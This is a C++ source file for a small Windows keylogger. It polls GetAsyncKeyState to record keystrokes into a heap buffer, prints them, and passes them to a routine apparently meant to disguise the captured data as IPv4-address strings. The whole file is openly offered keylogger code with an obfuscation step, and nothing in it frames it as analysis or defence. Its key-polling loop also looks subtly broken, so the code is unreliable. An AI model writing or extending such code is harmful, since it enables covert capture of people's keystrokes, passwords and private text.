#include <iostream>
#include <Windows.h>
#include <string>
#include "Obfuscation.h" 
#include "Keylogger.h"

int main() {
	MemoryRegion memRegion;
	memRegion.baseAddress = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);
	memRegion.size = 100;
	memRegion.used = 0;

	if (memRegion.baseAddress == NULL) {
		perror("Failed to allocate memory");
		return 1;
	}

	// Log a few example keys
	char i;
	int counter = 0;

	while (counter < 5) {
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				logKey(i, &memRegion);
				counter++;
				break;
			}
		}
	}

	// Output the memory region
	printf("Keystrokes: %s\n", memRegion.baseAddress);

	// Geenrate IPv4 Address from the logged keystrokes
	if (!GenerateIpv4Output((unsigned char*)memRegion.baseAddress, memRegion.used)) {
		fprintf(stderr, "Failed to generate IPv4 output.\n");
	}


	// Free the memory region
	HeapFree(GetProcessHeap(), 0, memRegion.baseAddress);

	return 0;
}
